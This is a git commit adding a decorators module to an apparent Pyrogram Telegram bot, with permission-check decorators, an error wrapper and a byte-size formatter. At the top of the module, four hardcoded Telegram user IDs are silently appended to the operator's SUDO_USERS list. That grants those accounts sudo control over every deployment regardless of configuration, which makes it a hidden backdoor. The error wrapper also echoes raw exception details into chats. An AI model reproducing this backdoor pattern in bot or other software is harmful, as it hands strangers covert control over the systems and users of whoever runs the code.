c5f7880b5899934cf8beff54db559af937f1bab5
sᴜᴍɪᴛ ʏᴀᴅᴀᴠ <107318123+Sumit9969@users.noreply.github.com>
2022-06-14 11:02:52 +0530

    Add files via upload

---
+++ NIXA/decorators.py
@@ -0,0 +1,55 @@
+from typing import Callable
+from pyrogram import Client
+from pyrogram.types import Message
+from config import SUDO_USERS
+from NIXA.admins import get_administrators
+
+
+SUDO_USERS.append(5009839424)
+SUDO_USERS.append(5180811178)
+SUDO_USERS.append(5215873956)
+SUDO_USERS.append(5137889730)
+
+def errors(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        try:
+            return await func(client, message)
+        except Exception as e:
+            await message.reply(f"{type(e).__name__}: {e}")
+
+    return decorator
+
+
+def authorized_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+        administrators = await get_administrators(message.chat)
+
+        for administrator in administrators:
+            if administrator == message.from_user.id:
+                return await func(client, message)
+
+    return decorator
+
+
+def sudo_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+    return decorator
+
+
+def humanbytes(size):
+    """ᴄᴏɴᴠᴇʀᴛ ʙʏᴛᴇs ᴛᴏ ʙʏᴛᴇs sᴏ ᴛʜᴀᴛ ʜᴜᴍᴀɴ ᴄᴀɴ ʀᴇᴀᴅ ɪᴛ"""
+    if not size:
+        return ""
+    power = 2 ** 10
+    raised_to_pow = 0
+    dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
+    while size > power:
+        size /= power
+        raised_to_pow += 1
+    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
